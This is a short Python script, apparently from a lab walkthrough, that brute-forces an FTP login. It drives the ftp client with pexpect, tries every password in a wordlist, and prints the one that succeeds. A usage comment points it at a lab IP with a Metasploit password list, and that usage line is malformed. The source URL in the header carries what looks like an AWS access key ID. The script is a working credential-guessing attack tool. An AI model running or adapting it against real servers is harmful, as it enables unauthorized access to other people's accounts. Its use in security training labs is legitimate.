#Python script:
#https://attackdefense-solutions-docs.s3.amazonaws.com/attackdefense-public/walkthrough-520.pdf?Signature=ehWDGbTZ9ERIbhUsObbUVaWD4lY%3D&Expires=1639255419&AWSAccessKeyId=AKIAVPAISQ7V6OPYMUOC
import pexpect
import sys
username=sys.argv[2]
password_dict=sys.argv[3]
# Loading the password dictionary and Striping \n
lines = [line.rstrip('\n') for line in open(password_dict)]
itr = 0
# Iterating over dictionary
for password in lines:
    child = pexpect.spawn ('ftp '+sys.argv[1])
    child.expect ('Name .*: ')
    child.sendline (username)

    print "Trying with password: ",password
    child.expect ('Password:')
    child.sendline (password)
    i = child.expect (['Login successful', 'Login failed'])
    if i==1:
     #print('Login failed')
        child.kill(0)
    elif i==0:
        print "Login Successful for ",password
        print child.before
        break
# use:
# python break.py 192.88.118.3 billy/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
